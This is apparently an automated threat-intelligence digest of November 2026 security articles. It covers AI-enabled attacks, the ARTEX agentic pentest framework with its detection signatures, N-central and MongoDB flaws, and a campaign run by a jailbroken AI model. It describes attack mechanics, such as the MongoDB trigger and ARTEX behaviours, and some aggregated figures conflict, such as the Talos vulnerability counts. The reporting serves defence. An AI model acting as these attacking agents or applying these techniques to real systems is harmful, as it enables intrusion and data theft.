orchestrated campaigns are likely to become more frequent, alongside a growing underground market for illicit access to commercial models and rising "noise" from low-level automated intrusions that complicate the detection of serious threats. Figure 1: Five trends in offensive use of AI (Source: Recorded Future) Analysis The Data Offensive use of AI remains a serious concern for cyber defenders, especially as recent advances in AI capabilities are increasing the risk of autonomous attacks. To better understand the risk, Insikt Group identified 103 incidents between July 31, 2025, and July 31, 2026, in which AI was part of a malicious campaign. To qualify, events had to be: Documented incidents that are searchable in the Recorded Future intelligence graph Confirmed as using AI as the attack vector, tool, or target Carried out by malicious actors in the wild, not as proofs-of-concept or security research Of the 103 incidents identified, 32 involved the use of AI in malware or to orchestrate offensive cyber operations. These incidents were categorized along Recorded Future’s AI Malware Maturity Model (AIM3) , which evaluates how AI is used in malicious or offensive software. The remaining 71 incidents were sorted into one of four categories that best describe how AI was abused: Targeting AI systems, infrastructure, or data: Attacks where AI platforms, tools, or companies are the direct target rather than a means of attack AI as lure or delivery vector: Social engineering that uses AI's current hype and popularity as bait to deliver malware, rather than exploiting anything technical about AI itself AI-assisted deception, fraud, or influence: AI used as a tool by the attacker to make fraud, phishing, or influence operations more convincing and personalized to the target audience Abuse or hijacking of AI agents/services: Misuse of legitimate AI systems' own capabilities, rather than a single dominant technique Figures 2 and 3: AI-related attacks documented by Insikt Group from July 2025 to July 2026 (Source: Recorded Future) Roughly one-third of the incidents across both datasets are financially motivated. Espionage cases are concentrated in the AIM3 dataset, with 9 of the 32 incidents attributed to state-sponsored intelligence collection. In one notable case, the threat actor was an AI agent that carried out an attack in order to pass a security benchmark. The remaining 23
```

#### Corroborating sources (1)

- **Recorded Future** (threat_research_primary)
  - Title: AI Is Both Target and Tool for Threat Actors
  - Published: 2026-11-11T00:00:00+00:00
  - Link: https://www.recordedfuture.com/research/ai-cyber-threat-trends-2026
  - Summary: Discover 2026 trends in AI-enabled cyber threats, supply-chain vulnerabilities, state-sponsored agentic attacks, and key mitigations.

### Cluster def4e1bd8b — score 21

- Title: ARTEX: Attackers apply agentic AI
- Source: Sophos X-Ops (detection_response_operations)
- Published: 2026-11-10T00:00:00+00:00
- Link: https://www.sophos.com/en-us/blog/artex-attackers-apply-agentic-ai
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: active_exploitation, web_shell_backdoor
- affected_products: Docker
- urgency_signals: actively_exploited
- content_type: news_report
- confidence_tier: tier_2_operator

#### Primary article taxonomy
- threat_categories: web_shell_backdoor, active_exploitation
- affected_products: Docker
- urgency_signals: actively_exploited
- content_type: news_report
- confidence_tier: tier_2_operator

#### Summary

```
<p>An agentic AI pentesting framework is being used in the wild by threat actors</p> Categories: Threat Research Tags: Agentic AI, Attack Tools, AI
```

#### Full body

```
ARTEX: Attackers apply agentic AI An agentic AI pentesting framework is being used in the wild by threat actors Written by Sophos X-Ops Threat Research Agentic AI Attack Tools AI Share This Link Copied Sophos X-Ops is tracking ARTEX, an open-source agentic AI penetration testing framework that multiple threat actors have used in intrusions since its public release in July 2026 . One of the most prominent cases is the ConnectWise Cloud Backup compromise in mid-October, which Microsoft attributes to Storm-0940, a group it assesses as “China-state aligned.” How ARTEX works ARTEX is an open-source, multi-agent penetration testing framework written in Go. It supports multiple LLM providers and compatible endpoints; in reported campaigns, operators have connected it to models including DeepSeek, GLM, and Grok. Given an objective, ARTEX has the following capabilities: Use planning agents to map the target and decide the next step Worker agents can invoke offensive tooling and feed results back into the planning process. In malicious deployments, this could include activities such as scanning, exploitation, credential access and webshell deployment Planning agents can adjust the plan and launch subsequent rounds via worker agents It records the assets and vulnerabilities it discovers in a graph as the test progresses Can attempt multiple breach paths at the same time In campaigns described by Microsoft and Google/Mandiant , operators have supplied ARTEX with authentication material or compromised application credentials and used it against cloud APIs and services, such as Microsoft Graph. Sophos countermeasures Sophos has existing endpoint, network, and cloud protections covering multiple behaviours and indicators associated with reported ARTEX activity. The protections below target ARTEX and the campaigns reported so far. Our evaluation of coverage is ongoing, and we will update this table as it changes. Layer Protection Taegis XDR ConnectWise Compromise: Service Principal Credential Added or Role Assigned by an Application ConnectWise app sign-in with scripted user agent File detection Troj/Bckdr-SDA (trojanized ARTEX Docker image) Troj/Loader-TU Linux/Agent-KD ATK/Artex-A ATK/Artex-B ATK/Artex-C Web and IP reputation IPs associated with publicly reported ARTEX use blocked as malware Sophos Firewall The following signatures have been released to Sophos Firewall and Endpoint IPS to cover network-observable ARTEX behaviours and indicators: 2313266 - SCAN ARTEX Agentic Framework OAuth illegal_redirect_uri_enhanced Error Response 2313265 - SCAN ARTEX Agentic Framework WWW-Authenticate Basic realm ARTEX Response Header 2313264 - SCAN ARTEX agentic-AI pentest framework baseline canary probe observed 2313263 - SCAN ARTEX agentic-AI pentest framework spec-driven API collection write attempt 2313261 - SCAN ARTEX agentic-AI pentest framework tenant isolation bypass attempt 2313259 - SCAN ARTEX agentic-AI pentest framework OAuth unregistered redirect URI abuse attempt 2313258 - SCAN ARTEX agentic-AI pentest framework unsigned JWT alg-none SSO bypass attempt 2313257 - SCAN ARTEX agentic-AI pentest framework suspicious User-Agent observed Endpoint IPS 2313266 - ARTEX Agentic Framework OAuth illegal_redirect_uri_enhanced Error Response 2313265 - ARTEX Agentic Framework WWW-Authenticate Basic realm ARTEX Response Header 2313264 - ARTEX agentic-AI pentest framework baseline canary probe observed 2313263 - ARTEX agentic-AI pentest framework spec-driven API collection write attempt 2313261 - ARTEX agentic-AI pentest framework tenant isolation bypass attempt 2313259 - ARTEX agentic-AI pentest framework OAuth unregistered redirect URI abuse attempt 2313258 - ARTEX agentic-AI pentest framework unsigned JWT alg-none SSO bypass attempt 2313257 - ARTEX agentic-AI pentest framework suspicious User-Agent observed Troj/Bckdr-SDA detects a backdoored copy of the ARTEX Docker image. The original project has been taken offline by its developer , so researchers s
```

#### Corroborating sources (1)

- **Sophos X-Ops** (detection_response_operations)
  - Title: ARTEX: Attackers apply agentic AI
  - Published: 2026-11-10T00:00:00+00:00
  - Link: https://www.sophos.com/en-us/blog/artex-attackers-apply-agentic-ai
  - Summary: <p>An agentic AI pentesting framework is being used in the wild by threat actors</p> Categories: Threat Research Tags: Agentic AI, Attack Tools, AI

### Cluster 927a1ad310 — score 21

- Title: Critical vulnerabilities in N-able N-central prompt hosted shutdown
- Source: Rapid7 (offensive_vulnerability_research)
- Published: 2026-11-10T14:20:34+00:00
- Link: https://www.rapid7.com/blog/post/etr-critical-vulnerabilities-in-n-able-n-central-prompt-hosted-shutdown
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- cve_ids: CVE-2026-125878, CVE-2026-125879, CVE-2026-125880, CVE-2026-125881, CVE-2026-125883
- urgency_signals: poc_available, preauth_unauth
- content_type: news_report
- confidence_tier: tier_1_offensive_research

#### Primary article taxonomy
- cve_ids: CVE-2026-125883, CVE-2026-125878, CVE-2026-125879, CVE-2026-125880, CVE-2026-125881
- urgency_signals: preauth_unauth, poc_available
- content_type: news_report
- confidence_tier: tier_1_offensive_research

#### Summary

```
Overview On November 9, 2026, N-able announced that it was responding to the public disclosure of critical vulnerabilities affecting N-central , its remote monitoring and management (RMM) platform. In a public disclosure titled Able2Shell, an independent researcher has published details and proof-of-concept (PoC) code covering 33 issues. According to the disclosure, the issues include unauthenticated remote code execution (RCE), privilege escalation to root, credential disclosure, and unauthorized account creation. One unauthenticated chain combines XML external entity (XXE) and session-handling weaknesses to execute code as the nable service account. Other demonstrated chains involve an administrator viewing malicious patch metadata or use ProductAdmin credentials. Rapid7 Intelligence is currently triaging the newly published details. Before the hotfix release on November 10, N-able reported scanning activity associated with the published PoC code and said it had no evidence that any
```

#### Full body

```
Emergent Threat Response Critical vulnerabilities in N-able N-central prompt hosted shutdown Rapid7 Nov 10, 2026 | Last updated on Nov 11, 2026 | 4 min read Critical vulnerabilities in N-able N-central prompt hosted shutdown Table of contents Critical vulnerabilities in N-able N-central prompt hosted shutdown Table of contents Overview On November 9, 2026, N-able announced that it was responding to the public disclosure of critical vulnerabilities affecting N-central , its remote monitoring and management (RMM) platform. In a public disclosure titled Able2Shell, an independent researcher has published details and proof-of-concept (PoC) code covering 33 issues. According to the disclosure, the issues include unauthenticated remote code execution (RCE), privilege escalation to root, credential disclosure, and unauthorized account creation. One unauthenticated chain combines XML external entity (XXE) and session-handling weaknesses to execute code as the nable service account. Other demonstrated chains involve an administrator viewing malicious patch metadata or use ProductAdmin credentials. Rapid7 Intelligence is currently triaging the newly published details. Before the hotfix release on November 10, N-able reported scanning activity associated with the published PoC code and said it had no evidence that any customer environment had been successfully exploited. The vendor advised keeping N-central deployments offline while it developed and validated a hotfix. Hosted N-central classic environments were offline, according to the same notice. That notice did not yet include CVE identifiers or CVSS scores. N-central is used by managed service providers (MSPs) and enterprise IT teams to administer endpoints and infrastructure. Compromise of an RMM server can put downstream managed environments at risk. N-central has previously been targeted through separate vulnerabilities, including an authentication bypass covered by Rapid7 in August 2026 . Given the platform's administrative reach and the availability of public exploit code, Rapid7 recommends treating the current disclosure as an emergency. Update #1: On November 10, 2026, N-able released N-central 2026.4 Hotfix 2 (build 2026.4.1.26 ), addressing seven CVEs. The vendor plans a follow-up hotfix with further security updates. On November 11, N-able confirmed that hosted N-central servers across all regions had been successfully upgraded. Mitigation guidance Rapid7 strongly recommends that organizations operating on-premises N-central servers upgrade to N-central 2026.4 Hotfix 2 (build 2026.4.1.26 ) on an emergency basis outside of normal patching cycles, and keep servers offline until successfully upgraded. Hosted servers are upgraded by N-able. Customers in both hosted and on-premises environments must also upgrade their Agents and Probes. To maintain communication, upgrade Agents first, then Probes, following the vendor's compatibility guidance for the Patch Management Engine (PME). Affected versions: The researcher reports testing N-central Appliance 2026.4.0.31 . N-able's current notice does not specify the full affected-version range. Fixed versions: N-central 2026.4 Hotfix 2 (build 2026.4.1.26 ) addresses the seven CVEs listed below. According to N-able's release notes , the hotfix addresses: CVE Description CVE-2026-125883 Multiple XXE vulnerabilities CVE-2026-125878 Multiple OGNL injection vulnerabilities CVE-2026-125879 Local privilege escalation to root through nable -writable syslog-ng configuration CVE-2026-125880 Stored XSS through MMS3 patch metadata in an administrator context CVE-2026-125881 Schema-hint SSRF through service-import schema validation CVE-2026-125882 RCE through file-repository upload path traversal; credited to Nate Fair, Sprocket Security CVE-2026-91000 Local privilege escalation through insecure IPC channels Further security updates are planned in a follow-up hotfix. Organizations should monitor the vendor's guidance and apply subsequent fixes as th
```

#### Corroborating sources (1)

- **Rapid7** (offensive_vulnerability_research)
  - Title: Critical vulnerabilities in N-able N-central prompt hosted shutdown
  - Published: 2026-11-10T14:20:34+00:00
  - Link: https://www.rapid7.com/blog/post/etr-critical-vulnerabilities-in-n-able-n-central-prompt-hosted-shutdown
  - Summary: Overview On November 9, 2026, N-able announced that it was responding to the public disclosure of critical vulnerabilities affecting N-central , its remote monitoring and management (RMM) platform. In a public disclosure titled Able2Shell, an independent researcher has published details and proof-of-concept (PoC) code covering 33 issues. According to the disclosure, the issues include unauthenticated remote code execution (RCE), privilege escalation to root, credential disclosure, and unauthorized account creation. One unauthenticated chain combines XML external entity (XXE) and session-handling weaknesses to execute code as the nable service account. Other demonstrated chains involve an administrator viewing malicious patch metadata or use ProductAdmin credentials. Rapid7 Intelligence is currently triaging the newly published details. Before the hotfix release on November 10, N-able reported scanning activity associated with the published PoC code and said it had no evidence that any

### Cluster af40f55acb — score 21

- Title: Risky Bulletin: Pro-Kremlin hacktivists dox EU politicians, law enforcement
- Source: Risky Business News (practitioner_analysis)
- Published: 2026-11-09T03:25:54+00:00
- Link: https://risky.biz/RBNEWS631/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: SonicWall

#### Cluster taxonomy (union across members)
- threat_categories: active_exploitation, zero_day
- affected_products: SonicWall
- urgency_signals: actively_exploited, zero_day
- content_type: news_report
- confidence_tier: tier_3_analysis

#### Primary article taxonomy
- threat_categories: zero_day, active_exploitation
- affected_products: SonicWall
- urgency_signals: actively_exploited, zero_day
- content_type: news_report
- confidence_tier: tier_3_analysis

#### Summary

```
Pro-Kremlin hacktivists dox EU politicians and law enforcement personnel a Deepfake gang arrested on US charges, SonicWall patches a zero-day, and SSHole is being exploited in the wild.
```

#### Full body

```
Risky Bulletin Podcast November 09, 2026 Risky Bulletin: Pro-Kremlin hacktivists dox EU politicians, law enforcement Presented by Catalin Cimpanu News Editor Claire Aird Newsreader Pro-Kremlin hacktivists dox EU politicians and law enforcement personnel a Deepfake gang arrested on US charges, SonicWall patches a zero-day, and SSHole is being exploited in the wild. Your browser does not support the audio element. Risky Bulletin: Pro-Kremlin hacktivists dox EU politicians, law enforcement â¶ 0:00 / 8:53 Subscribe Brought to you by Airlock Digital Allowlisting Software - Allowlist Made Simple Show notes Risky Bulletin: Pro-Kremlin hacktivists dox EU politicians, law enforcement
```

#### Corroborating sources (1)

- **Risky Business News** (practitioner_analysis)
  - Title: Risky Bulletin: Pro-Kremlin hacktivists dox EU politicians, law enforcement
  - Published: 2026-11-09T03:25:54+00:00
  - Link: https://risky.biz/RBNEWS631/
  - Summary: Pro-Kremlin hacktivists dox EU politicians and law enforcement personnel a Deepfake gang arrested on US charges, SonicWall patches a zero-day, and SSHole is being exploited in the wild.

### Cluster a3d4fba69b — score 20

- Title: CVE-2026-118383: Use-after-free vulnerability in MongoDB
- Source: Datadog Security Labs (cloud_identity_infrastructure)
- Published: 2026-11-11T00:00:00+00:00
- Link: https://securitylabs.datadoghq.com/articles/cve-2026-118383-mongodb-server-use-after-free/
- Fetch status: ok
- Member count: 2
- Corroborating source count: 2
- Strong signals: CVE-2026-118383

#### Cluster taxonomy (union across members)
- cve_ids: CVE-2026-118383
- urgency_signals: preauth_unauth
- content_type: vulnerability_disclosure
- confidence_tier: tier_2_operator, tier_4_news

#### Primary article taxonomy
- cve_ids: CVE-2026-118383
- urgency_signals: preauth_unauth
- content_type: vulnerability_disclosure
- confidence_tier: tier_2_operator

#### Summary

```
We reproduced CVE-2026-118383, a critical use-after-free in MongoDB Server's primary catch-up process that unauthenticated clients can set up, and explain how to detect and remediate it.
```

#### Full body

```
Sebastian Obregoso Senior Security Researcher Eslam Salem Manager, Security Research Nick Frichette Staff Security Researcher Greg Foss Manager, Threat Detection & Research Julie Agnes Sparks Senior Security Engineer Key points and observations CVE-2026-118383 is a critical use-after-free in MongoDB Server's primary catch-up process, with a CVSS v4.0 score of 9.5. It affects replica set members, including those used by shards and config servers. Standalone mongod instances are unaffected. Remote unauthenticated exploitation is possible, but only during a specific window that the attacker does not have visibility into. We reproduced a crash (segmentation fault) on MongoDB Server 8.0.34. An unauthenticated client can set up the crash with two ping requests, because vulnerable servers accept ping before login. Turning on authentication does not prevent this. Upgrade every affected replica set member to a fixed release. Restricting network access can reduce exposure while you upgrade. What happened MongoDB announced a security update on November 10 . The company said it found the vulnerability internally and was not aware of exploitation attempts at the time of its announcement. The advisory describes a use-after-free when a newly elected replica set primary completes catch-up. During catch-up, the member applies operations it missed before accepting writes as primary. The vulnerability affects ordinary replica set members. It also affects the replica set members used by shards and config servers in sharded clusters. A standalone mongod does not perform replica set primary catch-up and is not affected by this vulnerability. The advisory rates the issue Critical and says the server may terminate unexpectedly or, under certain conditions, execute arbitrary code in the server process. How to know if you are affected The issue affects replica set members, including shard and config server replica set members in sharded clusters. Standalone mongod instances are not affected. The MongoDB fix releases are: MongoDB Server branch First fixed release 9.0 9.0.7 8.3 8.3.16 8.0 8.0.37 7.0 7.0.48 6.0 6.0.30 5.0 5.0.35 4.4 4.4.32 Upgrade to the fixed release for your branch, or use a distributor package that includes the fix. Verify the version running on every member after the upgrade, including members in containers and any members that were offline during maintenance. MongoDB says Atlas clusters are upgraded automatically during maintenance. It urges customers who defer maintenance to apply the upgrade promptly. Until you can upgrade, restrict network access to MongoDB to the specific systems that need access to it. This limits who can send the unauthenticated requests, but it does not fix the use-after-free. Exploitation window and likelihood When a replica set member wins an election, it first catches up on writes it missed, then starts accepting new ones. The bug is in the cleanup at the end of that catch-up step. Before any election happens, an attacker can leave two stale âwaitersâ on a member. A waiter is a pending notification MongoDB creates when a request asks to wait until replication reaches a certain point. Planting them does not crash the server by itself. The diagram below traces an election timeline and marks where the crash fires. Plant during steady state : The attacker sends two unauthenticated ping requests that include a readConcern.afterOpTime value to a reachable, vulnerable replica set member. The waiters don't expire. They stay in place until the member restarts, rolls back, or steps down from primary. Reach catch-up : Later, the same member has to win an election while it is behind another member. The attacker can't cause the lag or the election. Both have to happen on their own, for example during maintenance or an outage. Crash when catch-up ends : When catch-up finishes, the new primary runs its cleanup twice, uses memory it has already freed, and crashes before it accepts any writes. Once the first two steps a
```

#### Corroborating sources (2)

- **Datadog Security Labs** (cloud_identity_infrastructure)
  - Title: CVE-2026-118383: Use-after-free vulnerability in MongoDB
  - Published: 2026-11-11T00:00:00+00:00
  - Link: https://securitylabs.datadoghq.com/articles/cve-2026-118383-mongodb-server-use-after-free/
  - Summary: We reproduced CVE-2026-118383, a critical use-after-free in MongoDB Server's primary catch-up process that unauthenticated clients can set up, and explain how to detect and remediate it.
- **The Hacker News** (cyber_news_breach_reporting)
  - Title: Critical Pre-Auth MongoDB Flaw (CVE-2026-118383) Can Crash Lagging Servers on Failover
  - Published: 2026-11-12T09:25:00+00:00
  - Link: https://thehackernews.com/2026/11/critical-pre-auth-mongodb-flaw-cve-2026.html
  - Summary: A critical flaw in MongoDB Server allows an unauthenticated attacker to send two requests that trigger a crash on the database server. The crash occurs only if that server is later chosen to take over as the main server while it still lacks some recent changes. MongoDB, the company that makes the database, released fixed versions earlier this week. The affected servers are members of a replica

### Cluster 8213947947 — score 19

- Title: November Patch Tuesday: An Overflowing Cornucopia of CVEs
- Source: Dark Reading (cyber_news_breach_reporting)
- Published: 2026-11-10T22:26:51+00:00
- Link: https://www.darkreading.com/vulnerabilities-threats/november-patch-tuesday-cornucopia-cves
- Fetch status: fetch_failed:HTTPError
- Member count: 2
- Corroborating source count: 2
- Strong signals: Microsoft SharePoint

#### Cluster taxonomy (union across members)
- threat_categories: active_exploitation, zero_day
- affected_products: Microsoft SharePoint
- urgency_signals: actively_exploited, zero_day
- content_type: news_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: zero_day, active_exploitation
- affected_products: Microsoft SharePoint
- urgency_signals: actively_exploited, zero_day
- content_type: news_report
- confidence_tier: tier_4_news

#### Summary

```
Microsoft serves up an actively exploited Outlook zero-day, and a wave of critical Exchange, SharePoint, Windows Search, and LDAP bugs that exhausted defenders need to prioritize fast.
```

#### Corroborating sources (2)

- **Dark Reading** (cyber_news_breach_reporting)
  - Title: November Patch Tuesday: An Overflowing Cornucopia of CVEs
  - Published: 2026-11-10T22:26:51+00:00
  - Link: https://www.darkreading.com/vulnerabilities-threats/november-patch-tuesday-cornucopia-cves
  - Summary: Microsoft serves up an actively exploited Outlook zero-day, and a wave of critical Exchange, SharePoint, Windows Search, and LDAP bugs that exhausted defenders need to prioritize fast.
- **The Hacker News** (cyber_news_breach_reporting)
  - Title: Microsoft Patches 1,259 Flaws, Including Exploited Outlook Bug That May Expose NTLMv2 Hashes
  - Published: 2026-11-11T08:17:53+00:00
  - Link: https://thehackernews.com/2026/11/microsoft-patches-1259-flaws-including.html
  - Summary: Microsoft on Tuesday released patches for a total of 1,259 vulnerabilities spanning its software portfolio, the second consecutive month where the patch volume has exceeded 1,000 flaws. These cover 726 flaws in Windows, 174 in Office, 61 in Developer Tools, 59 in SQL Server, 53 in Developer Tools, and 27 in SharePoint Server. The patches also include 165 non-Microsoft-issued CVE identifiers.

### Cluster a1853faf68 — score 18

- Title: Cisco BroadWorks and Openwave Flaws Actively Exploited Despite Available Patches
- Source: The Hacker News (cyber_news_breach_reporting)
- Published: 2026-11-11T06:04:02+00:00
- Link: https://thehackernews.com/2026/11/cisco-broadworks-and-openwave-flaws.html
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: CVE-2026-20320

#### Cluster taxonomy (union across members)
- threat_categories: active_exploitation
- affected_industries: telecommunications
- affected_products: Citrix, F5 BIG-IP, Palo Alto Networks
- cve_ids: CVE-2013-2165, CVE-2020-7961, CVE-2021-35464, CVE-2026-111793, CVE-2026-20320
- urgency_signals: actively_exploited, preauth_unauth
- content_type: news_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: active_exploitation
- affected_industries: telecommunications
- affected_products: Palo Alto Networks, F5 BIG-IP, Citrix
- cve_ids: CVE-2026-20320, CVE-2026-111793, CVE-2013-2165, CVE-2020-7961, CVE-2021-35464
- urgency_signals: actively_exploited, preauth_unauth
- content_type: news_report
- confidence_tier: tier_4_news

#### Summary

```
The U.S. Cybersecurity and Infrastructure Security Agency (CISA) Tuesday added two security flaws impacting Cisco BroadWorks and Openwave Messaging Webtop Media Transcoder to its Known Exploited Vulnerabilities (KEV) catalog, citing evidence of active exploitation. Details of the vulnerabilities are below - CVE-2026-20320 (CVSS score: 7.5) - An improper restriction of XML external entity
```

#### Full body

```
Cisco BroadWorks and Openwave Flaws Actively Exploited Despite Available Patches  Ravie Lakshmanan  Nov 11, 2026 Vulnerability / Enterprise Security The U.S. Cybersecurity and Infrastructure Security Agency (CISA) Tuesday added two security flaws impacting Cisco BroadWorks and Openwave Messaging Webtop Media Transcoder to its Known Exploited Vulnerabilities ( KEV ) catalog, citing evidence of active exploitation. Details of the vulnerabilities are below - CVE-2026-20320 (CVSS score: 7.5) - An improper restriction of XML external entity reference vulnerability in the Open Client Interface (OCI) XML Parser of Cisco BroadWorks that could allow an unauthenticated, remote attacker to read sensitive configuration information on an affected system with the privileges of the Cisco BroadWorks user. (Fixed in August 2026) CVE-2026-111793 (CVSS score: 4.3) - An incorrect resource transfer between spheres vulnerability in Openwave Messaging Webtop Media Transcoder that could allow an authenticated user to process and convert unintended document types if bypassing the Webmail experience. (Fixed in October 2026) The addition of CVE-2026-111793 to the KEV catalog follows an alert issued by Japan Vulnerability Notes (JPN), which noted in an advisory that the "developer states that attacks exploiting the vulnerability have been observed." The vulnerability information portal also warned that an authenticated attacker could exploit the vulnerability to upload a specially crafted file and obtain sensitive information. As for CVE-2026-20320, the security defect has been put to use as part of an agentic attack campaign dubbed Operation Snowball in which an unknown Chinese-speaking threat actor leveraged an autonomous framework built using a jailbroken version of the DeepSeek Flash model to target a European telecom provider and 13 companies hosted on its infrastructure. The activity resulted in the enumeration of hundreds of assets, extraction of dozens of credential sets, and exfiltration of thousands of rows of subscriber billing and device records from the provider's internal billing platform over a two-week period, according to Malbear Labs. The AI agent has capabilities to exploit a portfolio of known security vulnerabilities spanning a wide range of products, including - JBoss RichFaces ( CVE-2013-2165 ) Liferay CE/DXP ( CVE-2020-7961 ) ForgeRock OpenAM ( CVE-2021-35464 ) Linux ( CVE-2021-4034 ) SAP NetWeaver ( CVE-2022-22536 ) Cisco Expressway ( CVE-2023-20269 ) Citrix NetScaler( CVE-2023-4966 ) Qlik Sense ( CVE-2023-41265 , CVE-2023-41266 ) PAN-OS GlobalProtect ( CVE-2024-3400 , CVE-2024-9474 ) Adobe Experience Manager ( CVE-2025-54249 ) Broadcom VMware Cloud Director ( CVE-2026-2003 , CVE-2026-2004 , CVE-2026-2005 , CVE-2026-2006 ) Claris FileMaker Server ( CVE-2026-86934 ), and F5 BIG-IP ( CVE-2026-41225 ) "The primary target on the telecommunications provider's infrastructure was the BroadWorks XSP (eXtended Services Platform), Release 23.0.1.1075, running on port 2208," Malbear Labs said . "The agent exploited CVE-2026-20320, an unauthenticated XXE in the BroadWorks OCI XML parser." "From the XSP host, the agent recovered the system identity private key, three SSL credential sets, and three additional private keys with certificate matches confirmed. The system identity key is used by the BroadWorks platform to authenticate between its own components; possessing it allows impersonation of the XSP in inter-component communication." The activity has also been characterized by the use of reconnaissance tools, Sliver for post-exploitation, Chisel, along with web shells like Behinder for persistent access. "This is a threat actor who delegated the intrusion to an AI and checked in asynchronously to review progress," Malbear Labs added. The primary agent ran continuously, issued parallel tasks to worker agents, maintained a coherent operational plan across the full campaign, and adapted to defensive controls without pausing for operator inp
```

#### Corroborating sources (1)

- **The Hacker News** (cyber_news_breach_reporting)
  - Title: Cisco BroadWorks and Openwave Flaws Actively Exploited Despite Available Patches
  - Published: 2026-11-11T06:04:02+00:00
  - Link: https://thehackernews.com/2026/11/cisco-broadworks-and-openwave-flaws.html
  - Summary: The U.S. Cybersecurity and Infrastructure Security Agency (CISA) Tuesday added two security flaws impacting Cisco BroadWorks and Openwave Messaging Webtop Media Transcoder to its Known Exploited Vulnerabilities (KEV) catalog, citing evidence of active exploitation. Details of the vulnerabilities are below - CVE-2026-20320 (CVSS score: 7.5) - An improper restriction of XML external entity

### Cluster 75a070b13c — score 17

- Title: Microsoft Patch Tuesday for November 2026 — Snort rules and prominent vulnerabilities
- Source: Cisco Talos (threat_research_primary)
- Published: 2026-11-11T01:41:17+00:00
- Link: https://blog.talosintelligence.com/microsoft-patch-tuesday-for-november-2026/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: active_exploitation
- affected_products: Cisco
- cve_ids: CVE-2026-113862, CVE-2026-118146, CVE-2026-118148, CVE-2026-118207, CVE-2026-124194
- urgency_signals: actively_exploited
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Primary article taxonomy
- threat_categories: active_exploitation
- affected_products: Cisco
- cve_ids: CVE-2026-124194, CVE-2026-113862, CVE-2026-118146, CVE-2026-118148, CVE-2026-118207
- urgency_signals: actively_exploited
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Summary

```
Microsoft has released its monthly security update for November 2026, which includes 1328 vulnerabilities affecting a range of products, including 60 that Microsoft marked as "critical." Out of 60 "critical" vulnerabilities, 45 are remote code execution (RCE) vulnerabilities.
```

#### Full body

```
Microsoft Patch Tuesday for November 2026 — Snort rules and prominent vulnerabilities By Cisco Talos Tuesday, November 10, 2026 20:41 Patch Tuesday Microsoft has released its monthly security update for November 2026, which includes 1095 vulnerabilities affecting a range of products, including 64 that Microsoft marked as "critical." Microsoft notes that 1 of the vulnerabilities disclosed this month have been exploited in the wild CVE-2026-124194 affects Microsoft Office Outlook. CVE-2026-124194 is a spoofing vulnerability involving Product UI does not Warn User of Unsafe Actions and has a CVSS base score of 6.5. Out of 64 "critical" vulnerabilities, 48 are remote code execution (RCE) vulnerabilities. Microsoft considers exploitation of the following vulnerabilities more likely: CVE-2026-113862 affects Windows Network Address Translation (NAT). CVE-2026-113862 is a remote code execution vulnerability involving Use After Free and has a CVSS base score of 8.1. CVE-2026-118146 and CVE-2026-118148 affect Active Directory Domain Services. CVE-2026-118146 is a remote code execution vulnerability involving Incorrect Authorization and has a CVSS base score of 8.8. CVE-2026-118148 is an elevation of privilege vulnerability involving Incorrect Authorization and has a CVSS base score of 7.5. CVE-2026-118207 affects Microsoft Exchange Server. CVE-2026-118207 is a remote code execution vulnerability involving Use of Incorrectly-Resolved Name or Reference and has a CVSS base score of 8.8. CVE-2026-119952 affects Windows Schannel. CVE-2026-119952 is a remote code execution vulnerability involving Observable Timing Discrepancy and has a CVSS base score of 8.1. Microsoft considers exploitation of the following vulnerabilities less likely: CVE-2026-109459 and CVE-2026-119967 affect Windows Message Queuing Queue Manager. CVE-2026-109459 is a remote code execution vulnerability involving Heap-based Buffer Overflow and has a CVSS base score of 8.1. CVE-2026-119967 is a remote code execution vulnerability involving Use After Free and has a CVSS base score of 8.1. CVE-2026-110043 , CVE-2026-110068 and CVE-2026-111309 affect Microsoft Office Outlook. CVE-2026-110043 is a remote code execution vulnerability involving Heap-based Buffer Overflow and has a CVSS base score of 8.8. CVE-2026-110068 is a remote code execution vulnerability involving Use After Free and has a CVSS base score of 8.8. CVE-2026-111309 is a remote code execution vulnerability involving Release of Invalid Pointer or Reference and has a CVSS base score of 8.8. CVE-2026-110047 , CVE-2026-110067 , CVE-2026-111285 and CVE-2026-124185 affect Microsoft Office Word. CVE-2026-110047 is a remote code execution vulnerability involving Use After Free and has a CVSS base score of 8.8. CVE-2026-110067 is a remote code execution vulnerability involving Use After Free and has a CVSS base score of 8.8. CVE-2026-111285 is a remote code execution vulnerability involving Heap-based Buffer Overflow and has a CVSS base score of 8.8. CVE-2026-124185 is a remote code execution vulnerability involving Use of Uninitialized Resource and has a CVSS base score of 7.5. CVE-2026-111289 and CVE-2026-120003 affect Microsoft Office. CVE-2026-111289 is a remote code execution vulnerability involving Use After Free and has a CVSS base score of 8.8. CVE-2026-120003 is a remote code execution vulnerability involving Heap-based Buffer Overflow and has a CVSS base score of 8.8. CVE-2026-112967 affects Windows Xbox Live Networking Service. CVE-2026-112967 is a remote code execution vulnerability involving Heap-based Buffer Overflow and has a CVSS base score of 9.8. CVE-2026-113752 affects Windows Print Spooler Components. CVE-2026-113752 is a remote code execution vulnerability involving Use After Free and has a CVSS base score of 7.5. CVE-2026-113753 , CVE-2026-113856 , CVE-2026-113860 , CVE-2026-113861 , CVE-2026-113865 , CVE-2026-119947 , CVE-2026-119960 and CVE-2026-113864 affect Windows Hyper-V. CVE-2026-113753 is an
```

#### Corroborating sources (1)

- **Cisco Talos** (threat_research_primary)
  - Title: Microsoft Patch Tuesday for November 2026 — Snort rules and prominent vulnerabilities
  - Published: 2026-11-11T01:41:17+00:00
  - Link: https://blog.talosintelligence.com/microsoft-patch-tuesday-for-november-2026/
  - Summary: Microsoft has released its monthly security update for November 2026, which includes 1328 vulnerabilities affecting a range of products, including 60 that Microsoft marked as "critical." Out of 60 "critical" vulnerabilities, 45 are remote code execution (RCE) vulnerabilities.

### Cluster 6ed7d76d5e — score 16

